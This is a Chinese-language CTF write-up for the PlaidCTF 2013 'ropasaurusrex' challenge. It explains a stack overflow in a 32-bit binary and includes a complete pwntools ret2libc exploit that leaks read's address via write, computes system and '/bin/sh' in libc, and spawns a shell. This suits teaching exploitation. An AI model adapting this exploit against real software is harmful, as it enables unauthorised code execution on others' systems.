---
title: '''PlaidCTF-2013-ropasaurusrex'''
date: 2018-03-17 20:36:41
tags: pwn
---
分析：  
buf大小只有0x88,但是却允许被读入0x100的字节大小，造成缓冲区溢出。程序是32位。  
定义函数：ssize_t write (int fd, const void * buf, size_t count);   
函数说明：write()会把参数buf 所指的内存写入count 个字节到参数fd 所指的文件内. 当然, 文件读写位置也会随之移动.  

攻击思路：   
1.构造 payload leak 内存中的一个函数地址，比如 read ，write（返回地址是有漏洞的函数，以便第二次利用）
2.计算libc base，得到 system 地址
3.构造payload get shell


info leak:  
payload：  
`'A' * N + p32(write_plt) + p32(ret) + p32(1) + p32(address) + p32(4)`  
输入N个字符后发生溢出，write_plt的地址将会覆盖 read 函数的返回地址，随后程序将会跳转到write函数，我们在栈中构造了write函数的3个参数和返回地址，这段payload相当于让程序执行
`write(1, address, 4)`;   
这样就可以dump出内存中地址为address处的4字节数据。 (参考：[初探ROP攻击 Memory Leak & DynELF](http://blog.csdn.net/smalosnail/article/details/53386353))
```
from pwn import *
elf = ELF('./ropasaurusrex')
io = process('./ropasaurusrex')
libc = ELF('/lib/i386-linux-gnu/libc.so.6') #原本写的 ./libc.so.6 出错了
buf_len = 0x88  
vun_fun = 0x80483F4   #存在漏洞函数的地址
read_offset = libc.symbols['read']
#leak info 
payload = 'a'*140+p32(elf.symbols['write'])+p32(vun_fun)+p32(1)+p32(elf.got['read'])+p32(4)
io.send(payload)
msg = io.recv(4)
read_addr = u32(msg)

#get shell
libc_base = read_addr-read_offset
sys_addr = libc_base+libc.symbols['system']
bin_addr = libc_base+next(libc.search('/bin/sh'))
payload = 'a'*140+p32(sys_addr)+p32(0xdeafbeef)+p32(bin_addr)

io.send(payload)
io.interactive()
```
